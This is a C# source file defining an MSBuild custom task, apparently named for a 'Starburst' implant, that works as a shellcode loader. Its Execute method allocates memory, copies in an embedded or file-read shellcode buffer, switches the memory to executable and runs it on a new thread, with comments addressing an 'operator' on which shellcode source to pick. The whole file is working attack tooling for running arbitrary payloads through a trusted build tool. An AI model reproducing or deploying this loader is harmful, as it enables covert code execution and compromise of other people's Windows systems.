using System;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class StarburstTask : Task
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(
        IntPtr lpAddress,
        uint dwSize,
        uint flNewProtect,
        out uint lpflOldProtect
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(
        IntPtr hHandle,
        uint dwMilliseconds
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_READWRITE = 0x04;
    const uint PAGE_EXECUTE_READ = 0x20;
    const uint INFINITE = 0xFFFFFFFF;

    public override bool Execute()
    {
        // --- OPERATOR: Choose one shellcode source ---

        // OPTION A: Embedded shellcode byte array
        // Replace these bytes with your Starburst shellcode
        byte[] shellcode = new byte[] {
            0xfc, 0x48, 0x83, 0xe4, 0xf0  // PLACEHOLDER - replace with real shellcode
        };

        // OPTION B: Read shellcode from file (uncomment below, comment out Option A)
        // string scPath = @"C:\path\to\starburst.bin";
        // byte[] shellcode = File.ReadAllBytes(scPath);

        // Allocate RW memory
        IntPtr address = VirtualAlloc(
            IntPtr.Zero,
            (uint)shellcode.Length,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        if (address == IntPtr.Zero)
        {
            return false;
        }

        // Copy shellcode to allocated memory
        Marshal.Copy(shellcode, 0, address, shellcode.Length);

        // Clear shellcode from managed memory
        Array.Clear(shellcode, 0, shellcode.Length);

        // Flip memory protection from RW to RX
        uint oldProtect;
        if (!VirtualProtect(address, (uint)shellcode.Length, PAGE_EXECUTE_READ, out oldProtect))
        {
            return false;
        }

        // Create thread at shellcode address
        uint threadId;
        IntPtr threadHandle = CreateThread(
            IntPtr.Zero,
            0,
            address,
            IntPtr.Zero,
            0,
            out threadId
        );

        if (threadHandle == IntPtr.Zero)
        {
            return false;
        }

        // Wait for thread to complete
        WaitForSingleObject(threadHandle, INFINITE);
        CloseHandle(threadHandle);

        return true;
    }
}
